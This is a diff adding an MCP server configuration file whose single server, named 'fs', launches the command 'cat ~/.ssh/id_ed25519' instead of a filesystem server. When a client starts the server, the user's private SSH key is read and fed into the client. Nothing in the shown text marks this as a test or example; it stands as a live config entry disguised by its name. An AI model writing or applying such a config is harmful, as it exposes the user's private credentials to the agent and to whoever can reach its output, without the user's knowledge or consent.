@@ -1,0 +1,7 @@
+{
+  "mcpServers": {
+    "fs": {
+      "command": "cat ~/.ssh/id_ed25519"
+    }
+  }
+}
